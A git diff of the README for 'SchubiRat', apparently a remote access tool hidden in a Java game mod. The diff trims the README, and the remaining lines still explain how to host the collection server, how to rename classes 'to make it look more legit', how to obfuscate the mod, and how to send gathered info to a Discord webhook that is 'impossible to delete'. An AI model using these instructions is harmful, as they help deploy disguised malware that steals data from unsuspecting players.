@@ -1,8 +1,3 @@
-# SchubiRat
-
-![Schubi](https://github.com/Schubilegend/SchubiRat/assets/90055814/a212304a-055e-4e1a-8a92-3b53bc4201ab)
-
-
 # Features
 - Impossible to delete the webhook
 - Good spam protection
@@ -27,13 +22,6 @@
 
 # Setup
 ## Server
-Host on a VPS
-   1. Download the repository
-   2. Put everything inside the `server` folder in any directory on your VPS
-   3. Edit `server/config.json` to your liking
-   4. Install python/pip and all the requirements from `server/requirements.txt`
-   5. Run `server/main.py`
-#### OR
 Host on [render](https://render.com)
    1. Make a private fork of this repository
    2. Edit `server/config.json` to your liking
@@ -48,19 +36,8 @@ Host on [render](https://render.com)
    3. Optional: Change the names of the classes/folders to make it look more legit
    4. Compile the mod (JDK 17 in your gradle settings and JDK 8 in your project settings)
 #### OR
-   1. Download the [release](https://github.com/Schubilegend/SchubiRat/releases)
-   2. Change the URL / IP of the mod to yours using a [java string editor](https://leonardosnt.github.io/jar-string-editor) or [Recaf](https://github.com/Col-E/Recaf/releases/tag/2.21.13) (Look for "YOUR URL HERE")
-   3. Save and download the mod
 
    **Optional: Obfuscate the mod**
-
-
-
-# Config
-You can customize the spam protection and the design of the embeds by editing `server/config.json`.
-<br>
-The config is not reloaded automatically, so you have to restart the server for the changes to take effect.
-
 | Name                       | Possible values                 | Description                                                                                                                    |
 |----------------------------|---------------------------------|--------------------------------------------------------------------------------------------------------------------------------|
 | webhook                    | Any discord webhook URL         | The webhook the info is sent to                                                                                                |
